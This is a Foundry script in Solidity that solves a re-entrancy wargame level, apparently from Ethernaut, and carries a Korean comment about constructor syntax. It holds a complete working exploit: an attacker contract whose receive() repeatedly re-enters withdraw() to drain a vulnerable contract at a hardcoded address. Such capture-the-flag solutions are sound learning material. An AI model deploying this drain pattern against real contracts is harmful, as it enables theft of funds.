// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Level10ReEntrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ReEntrancyAttackContract {
    Reentrance public reentranceInstance;

    // 0.6 버전에서는 constructor에 public을 명시해줘야한다.
    constructor (Reentrance _reentranceInstance) payable public {
        reentranceInstance = _reentranceInstance;
        reentranceInstance.donate{value: 0.001 ether}(payable(address(this)));
    }

    function withdraw() public {
        reentranceInstance.withdraw(0.001 ether);
    }

    receive() external payable {
        console.log("ReEntrancyAttackContract balance: ", address(this).balance);
        reentranceInstance.withdraw(0.001 ether);
    }
}

contract Level10ReEntrancySolution is Script{
    Reentrance reentranceInstance = Reentrance(payable(0x980CE234Ca3e4EDF0Cd80200d9aa43ED7Ecc0E45));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before Reentrance contract balance: ", address(reentranceInstance).balance);
        ReEntrancyAttackContract reentrancyattackcontractInstance =  new ReEntrancyAttackContract{value: 0.001 ether}(reentranceInstance);
        reentrancyattackcontractInstance.withdraw();
        
        console.log("After Reentrance contract balance: ", address(reentranceInstance).balance);

        vm.stopBroadcast();
    }
}